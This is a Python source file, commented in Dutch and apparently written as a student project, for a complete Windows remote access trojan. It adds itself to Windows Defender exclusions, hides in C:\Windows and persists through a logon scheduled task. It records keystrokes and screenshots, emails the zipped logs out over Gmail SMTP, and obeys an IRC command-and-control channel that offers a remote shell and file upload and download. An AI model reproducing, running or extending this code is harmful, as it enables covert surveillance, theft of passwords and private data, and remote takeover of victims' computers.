import os, smtplib, shutil, threading, subprocess, sys, time, zipfile, json, socket, base64
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime

# Importeert de externe imports om het script te runnen
try:
    import keyboard, pyautogui
except:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "keyboard"])
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyautogui"])
    import keyboard, pyautogui

# variabelen
exitEvent = threading.Event()
now = datetime.now()
dateTimeFull = now.strftime("%d/%m/%Y, %H:%M:%S")
dateTimeFolder = now.strftime("%d.%m.%Y_%H.%M.%S")
dateTimeDay = now.strftime("%d-%m-%Y")
scriptPath = os.path.abspath("C:\\Windows\\s142486_WormFolder\\RAT.pyw")
hiddenFolderPath = os.path.expanduser("C:\\Windows\\s142486_WormFolder")
path = f"C:\\Windows\\s142486_WormFolder\\Logs_{dateTimeFolder}\\keylog.txt"
logs = "C:\\Windows\\s142486_WormFolder" 
paramsPath = os.path.join(hiddenFolderPath, "Params.json")

# secret reading
def read_secrets(secrets_file):
    secrets = {}
    try:
        with open(secrets_file, 'r') as file:
            for line in file:
                key, value = line.strip().split('=', 1)
                secrets[key.strip()] = value.strip()
    except FileNotFoundError:
        pass
    return secrets

secrets = read_secrets('.secret')

# EXPRESS EMAIL SETTINGS EXPLICIET VERMELD OM TRANSPARANT TE ZIJN, DIT IS EEN TESTACCOUNT EN WORDT NIET GEBRUIKT VOOR MALWARE APP PASSWORD WORD WEL VERBORGEN
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
EMAIL = secrets.get('mail', '')
PASSWORD = secrets.get('gmail_app_password', '')
logLock = threading.Lock()
screenshotCount = 0

# Maakt de default parameters aan in een JSON bestand als het bestand niet bestaat
def createParamJson():
    defaultParams = {
        "TimeBetweenEachScreenshot" : 300,
        "LogKeys" : True,
        "LogScreen" : True,
        "Logging" : True,
        "EnableKillSwitch" : True,
        "persistentMailInterval" : 120
    }
    
    if not os.path.exists(paramsPath):
        with open(paramsPath, 'w') as paramsFile:
            json.dump(defaultParams, paramsFile, indent=4)

# Laadt de parameters uit de JSON file, of gebruikt default waarden als het bestand niet bestaat
def loadParams():
    if os.path.exists(paramsPath):
        with open(paramsPath, 'r') as paramsFile:
            paramsContent = json.load(paramsFile)
            timeBetweenScreenshots = paramsContent.get("TimeBetweenEachScreenshot")
            logKeys = paramsContent.get("LogKeys")
            logScreen = paramsContent.get("LogScreen")
            logging = paramsContent.get("Logging")
            enableKillSwitch = paramsContent.get("EnableKillSwitch")
            persistentMailInterval = paramsContent.get("persistentMailInterval")
            return timeBetweenScreenshots, logKeys, logScreen, logging, enableKillSwitch, persistentMailInterval
    else :
        timeBetweenScreenshots = 300
        logKeys = True
        logScreen = True
        logging = True
        enableKillSwitch = True
        persistentMailInterval = 120
        return timeBetweenScreenshots, logKeys, logScreen, logging, enableKillSwitch, persistentMailInterval

timeBetweenScreenshots, logKeys, logScreen, logging, enableKillSwitch, persistentMailInterval = loadParams()

# Voegt de verborgen folder toe aan de Windows Defender uitsluitingen
def add_defender_exclusion():
    try:
        subprocess.run(
            [
                "powershell.exe",
                "-NoProfile",
                "-Command",
                f'Add-MpPreference -ExclusionPath "{hiddenFolderPath}"'
            ],
            capture_output=True,
            check=True
        )
    except subprocess.CalledProcessError:
        pass

# functie die een taak maakt in taakplanner waarbij het script zichzelf uitvoert
def runOnLogin(taskName, scriptPath):
    command = [
        "schtasks",
        "/create",
        "/sc", "ONLOGON",
        "/tn", taskName,
        "/tr", f'"{sys.executable.replace("python.exe", "pythonw.exe")}" "{scriptPath}"',
        "/rl", "highest",
        "/F" 
    ]
    
    result = subprocess.run(
        command,
        capture_output=True,
        text=True
    )

    if result.returncode != 0:
        print(result.stderr)
        return

    # Battery-instellingen
    powershell_command = [
        "powershell",
        "-NoProfile",
        "-Command",
        f'''
        $settings = New-ScheduledTaskSettingsSet `
            -AllowStartIfOnBatteries `
            -DontStopIfGoingOnBatteries

        Set-ScheduledTask `
            -TaskName "{taskName}" `
            -Settings $settings
        '''
    ]

    result = subprocess.run(
        powershell_command,
        capture_output=True,
        text=True
    )

    if result.returncode != 0:
        print("PowerShell error:")
        print(result.stderr)
    
# maakt de folder scructuur
def makeStructure():
    if not os.path.exists(hiddenFolderPath):
        os.makedirs(hiddenFolderPath)
    os.system(f'attrib +h "{hiddenFolderPath}"')
    if not os.path.exists(hiddenFolderPath+f"\\Logs_{dateTimeFolder}"):
        os.makedirs(hiddenFolderPath+f"\\Logs_{dateTimeFolder}")
    if logScreen:
        if not os.path.exists(hiddenFolderPath+f"\\Logs_{dateTimeFolder}\\ScreenLogs"):
            os.makedirs(hiddenFolderPath+f"\\Logs_{dateTimeFolder}\\ScreenLogs")
            
# kopieert het script van waar het ook gerunned wordt
def copyScript(hiddenFolderPath):
    scriptPath = os.path.abspath(__file__)
    destinationPath = os.path.join(hiddenFolderPath, os.path.basename(scriptPath))

    if not os.path.exists(destinationPath):
        shutil.copy(scriptPath, hiddenFolderPath)

# zipt de logs van de vorige sessie en roept dan de mail functie
def zipAllPrevSessions(logsDir):
    """Zipt alle oude sessie-folders (alles behalve de huidige sessie)"""
    currentSession = f"Logs_{dateTimeFolder}"
    
    for item in os.listdir(logsDir):
        itemPath = os.path.join(logsDir, item)
        # skip huidige sessie, bestaande zips, en niet-folders
        if item == currentSession or not os.path.isdir(itemPath) or item == os.path.basename(hiddenFolderPath):
            continue
        if not item.startswith("Logs_"):
            continue
            
        zipPath = os.path.join(logsDir, f"{item}.zip")
        if not os.path.exists(zipPath):
            with zipfile.ZipFile(zipPath, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, _, files in os.walk(itemPath):
                    for file in files:
                        filePath = os.path.join(root, file)
                        arcname = os.path.relpath(filePath, start=logsDir)
                        zipf.write(filePath, arcname)
        shutil.rmtree(itemPath)

# Mail functie
def sendSingleMail(zipFile):
    """Stuurt één zip als aparte mail. Returnt True bij succes."""
    try:
        msg = MIMEMultipart()
        msg["From"] = EMAIL
        msg["To"] = EMAIL
        msg["Subject"] = os.getlogin()
        msg.attach(MIMEText(f"{os.path.basename(zipFile)}", "plain"))

        with open(zipFile, "rb") as attachment:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header(
                "Content-Disposition",
                f'attachment; filename="{os.path.basename(zipFile)}"',
            )
            msg.attach(part)

        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT, timeout=10)
        server.starttls()
        server.login(EMAIL, PASSWORD)
        server.sendmail(EMAIL, EMAIL, msg.as_string())
        server.quit()
        return True
    except Exception:
        return False
    
# Mail queue functie die alle zips in de map stuurt
def mailQueue():
    while not exitEvent.is_set():
        zipFiles = [
            os.path.join(logs, f) 
            for f in os.listdir(logs) 
            if f.endswith(".zip")
        ]
        
        if not zipFiles:
            exitEvent.wait(persistentMailInterval)
            continue
        
        for zipFile in zipFiles:
            if sendSingleMail(zipFile):
                os.remove(zipFile)
        
        # wacht 2 min, maar check exitEvent zodat killswitch werkt
        exitEvent.wait(persistentMailInterval)

# Screenlog functie — controleert de vlaggen binnenin de lus zodat !spy screen on/off live werkt
def screenLogger():
    global screenshotCount
    while not exitEvent.is_set():
        if not (logScreen and logging):
            exitEvent.wait(5)
            continue
        screenshotCount += 1
        timestamp = datetime.now().strftime("%H.%M.%S")
        filename = f"{hiddenFolderPath}\\Logs_{dateTimeFolder}\\ScreenLogs\\Screenlog_{timestamp}_{screenshotCount}.jpg"
        screenshot = pyautogui.screenshot()
        screenshot.save(filename)
        with logLock:
            with open(path, 'a') as f:
                f.write(f"\n|== SCREENSHOT #{screenshotCount} | {timestamp} ==|\n")
        exitEvent.wait(timeBetweenScreenshots)

# Keylog functie — vlag wordt binnenin de lus gecheckt zodat !spy keylog on/off live werkt.
# keyboard.read_event() blokkeert tot een toets, dan checken we de vlag en gooien we de event
# weg als logging uitgeschakeld is, zonder de thread te stoppen.
def keyLogger():
    with open(path, 'a') as dataFile:
        dataFile.write(
            "|============================================================================|\n"
            f"|         V         ! KEYBOARD LOG: {dateTimeFull} !         V         |\n"
            "|============================================================================|\n\n"
            f"<<{now.strftime('%H:%M')}>> "
        )
        key_map = {
            "space": " ",
            "windows gauche": " *WINDOW* ",
            "backspace": " *BACKSPACE* ",
            "alt": " *ALT* ",
            "alt gr": " *ALT_GR* ",
            "ctrl droite": " *RIGHT_CTRL* ",
            "ctrl": " *CTRL* ",
            "maj": " *SHIFT* ",
            "right shift": " *RIGHT_SHIFT* ",
            "verr.maj": " *SHIFT_LOCK* ",
            "tab": " *TAB* ",
            "haut": " *ARROW_UP* ",
            "gauche": " *ARROW_LEFT* ",
            "bas": " *ARROW_DOWN* ",
            "droite": " *ARROW_RIGHT* ",
            "enter": " ENTER\n",
            "suppr": " *DELETE* ",
            "esc": " *ESCAPE* ",
            "f1": " *F1* ",
            "f2": " *F2* ",
            "f3": " *F3* ",
            "f4": " *F4* ",
            "f5": " *F5* ",
            "f6": " *F6* ",
            "f7": " *F7* ",
            "f8": " *F8* ",
            "f9": " *F9* ",
            "f10": " *F10* ",
            "f11": " *F11* ",
            "f12": " *F12* "
        }
        while not exitEvent.is_set():
            try:
                tempNow = datetime.now()
                event = keyboard.read_event()
                if not (logKeys and logging):
                    continue
                if event.event_type == keyboard.KEY_DOWN:
                    with logLock:
                        if event.name in key_map:
                            dataFile.write(key_map[event.name])
                            if event.name == "enter":
                                dataFile.write(f"<<{tempNow.strftime('%H:%M')}>> ")
                        else:
                            dataFile.write(event.name)
                        dataFile.flush()
            except Exception as e:
                dataFile.write(f"Error: {e}\n")
                dataFile.flush()
                break

# ── C2: command handler ──────────────────────────────────────────────────────
# Verwerkt IRC berichten van de operator en stuurt een antwoord terug via send_fn.
# Ondersteunde commando's:
#   !shell <cmd>                          — voer een shell-commando uit
#   !download <pad>                       — stuur een bestand als base64 terug
#   !upload <pad> <base64>                — schrijf base64-data naar een bestand
#   !spy <keylog|screen|mail> <on|off>    — zet een spy-functie aan/uit
#   !status                               — toon huidige instellingen en hostname
#   !help                                 — toon alle commando's
def handle_c2_command(msg, send_fn, channel):
    global logKeys, logScreen, logging

    def reply(text):
        # Normaliseer eerst alle \r zodat ze geen terminal-cursor-terugsprint veroorzaken,
        # splits dan op regeleindes, max 20 regels
        clean = text.replace('\r\n', '\n').replace('\r', '\n')
        lines = [l.strip() for l in clean.split('\n') if l.strip()]
        if not lines:
            send_fn(f'PRIVMSG {channel} :(geen output)')
            return
        for line in lines[:20]:
            send_fn(f'PRIVMSG {channel} :{line[:400]}')

    if msg.startswith('!shell '):
        cmd = msg[7:]
        try:
            raw = subprocess.check_output(
                cmd, shell=True, stderr=subprocess.STDOUT, timeout=30
            )
            output = raw.decode('utf-8', errors='replace').replace('\r\n', '\n').replace('\r', '\n').strip()
            reply(output or '(geen output)')
        except subprocess.CalledProcessError as e:
            raw_err = (e.output or b'')
            err = raw_err.decode('utf-8', errors='replace').replace('\r\n', '\n').replace('\r', '\n').strip()
            reply(f'Fout (code {e.returncode}): {err}')
        except subprocess.TimeoutExpired:
            reply('Commando time-out na 30s')

    elif msg.startswith('!download '):
        file_path = msg[10:].strip()
        try:
            with open(file_path, 'rb') as f:
                data = base64.b64encode(f.read()).decode()
            reply(f'FILE:{os.path.basename(file_path)}:{data}')
        except Exception as e:
            reply(f'Download fout: {e}')

    elif msg.startswith('!upload '):
        parts = msg[8:].split(' ', 1)
        if len(parts) != 2:
            reply('Gebruik: !upload <pad> <base64data>')
            return
        dest_path, b64data = parts
        try:
            decoded = base64.b64decode(b64data)
            with open(dest_path, 'wb') as f:
                f.write(decoded)
            reply(f'Upload geslaagd: {len(decoded)} bytes naar {dest_path}')
        except Exception as e:
            reply(f'Upload fout: {e}')

    elif msg.startswith('!spy '):
        parts = msg[5:].split()
        if len(parts) != 2:
            reply('Gebruik: !spy <keylog|screen|mail> <on|off>')
            return
        feature, state = parts[0].lower(), parts[1].lower()
        if state not in ('on', 'off'):
            reply('State moet on of off zijn')
            return
        value = (state == 'on')
        if feature == 'keylog':
            logKeys = value
            reply(f'Keylogging: {state}')
        elif feature == 'screen':
            logScreen = value
            reply(f'Schermopname: {state}')
        elif feature == 'mail':
            logging = value
            reply(f'Mail-exfiltratie: {state}')
        else:
            reply(f'Onbekende functie: {feature} — gebruik keylog, screen of mail')

    elif msg == '!status':
        reply(
            f'Host: {os.getlogin()} | keylog={logKeys} | '
            f'screen={logScreen} | mail={logging} | screenshots={screenshotCount}'
        )

    elif msg == '!help':
        reply(
            '!shell <cmd> | !download <pad> | !upload <pad> <b64> | '
            '!spy <keylog|screen|mail> <on|off> | !status | !help'
        )


# ── C2: IRC agent ─────────────────────────────────────────────────────────────
# Verbindt met de IRC C2-server uit .secret, joint het kanaal en wacht op
# commando's van de operator. Herverbindt automatisch na een verbrekende verbinding.
# Vereiste .secret sleutels: c2_server, c2_port (optioneel, standaard 6667),
#   c2_channel (optioneel, standaard #c2), operator_nick.
def c2Agent():
    c2_server = secrets.get('c2_server', '')
    c2_port = int(secrets.get('c2_port', '6667'))
    c2_channel = secrets.get('c2_channel', '#c2')
    c2_nick = f"bot_{os.getlogin()}"
    operator_nick = secrets.get('operator_nick', '')

    if not c2_server or not operator_nick:
        return

    while not exitEvent.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((c2_server, c2_port))
            sock.settimeout(1.0)

            def send_irc(msg):
                try:
                    sock.sendall((msg + '\r\n').encode('utf-8'))
                except Exception:
                    pass

            send_irc(f'NICK {c2_nick}')
            send_irc(f'USER {c2_nick} 0 * :{c2_nick}')

            buf = ''
            joined = False

            while not exitEvent.is_set():
                try:
                    chunk = sock.recv(4096).decode('utf-8', errors='replace')
                    if not chunk:
                        break
                    buf += chunk
                    lines = buf.split('\r\n')
                    buf = lines[-1]

                    for line in lines[:-1]:
                        if line.startswith('PING'):
                            send_irc('PONG ' + line.split(' ', 1)[1])
                        elif ' 001 ' in line and not joined:
                            send_irc(f'JOIN {c2_channel}')
                            joined = True
                        elif ' PRIVMSG ' in line:
                            parts = line.split(' ', 3)
                            if len(parts) < 4:
                                continue
                            sender = parts[0].lstrip(':').split('!')[0]
                            if sender != operator_nick:
                                continue
                            command_msg = parts[3].lstrip(':').strip()
                            handle_c2_command(command_msg, send_irc, c2_channel)
                except socket.timeout:
                    continue
                except Exception:
                    break

            sock.close()

        except Exception:
            pass

        exitEvent.wait(30)

# Killswitch functie
def killSwitch():
    if enableKillSwitch:
        keyboard.wait("ctrl+alt+k")
        exitEvent.set()
    

if __name__ == "__main__":
    try:    
        add_defender_exclusion()
        runOnLogin("s142486_Worm", scriptPath)
        makeStructure()
        copyScript(hiddenFolderPath)
        createParamJson()
        zipAllPrevSessions(hiddenFolderPath)

        keyLog_thread = threading.Thread(target=keyLogger, name="KeyLogger")
        screenLog_thread = threading.Thread(target=screenLogger, name="ScreenLogger")
        kill_thread = threading.Thread(target=killSwitch, name="StopKeybindMonitor")
        mail_thread = threading.Thread(target=mailQueue, name="MailQueue", daemon=True)
        c2_thread = threading.Thread(target=c2Agent, name="C2Agent", daemon=True)

        keyLog_thread.start()
        screenLog_thread.start()
        kill_thread.start()
        mail_thread.start()
        c2_thread.start()

        keyLog_thread.join()
        screenLog_thread.join()
        kill_thread.join()
        
    except Exception as e:
        with open(os.path.join(hiddenFolderPath, "error.log"), 'a') as f:
            f.write(f"{datetime.now()} | FATAL: {e}\n")
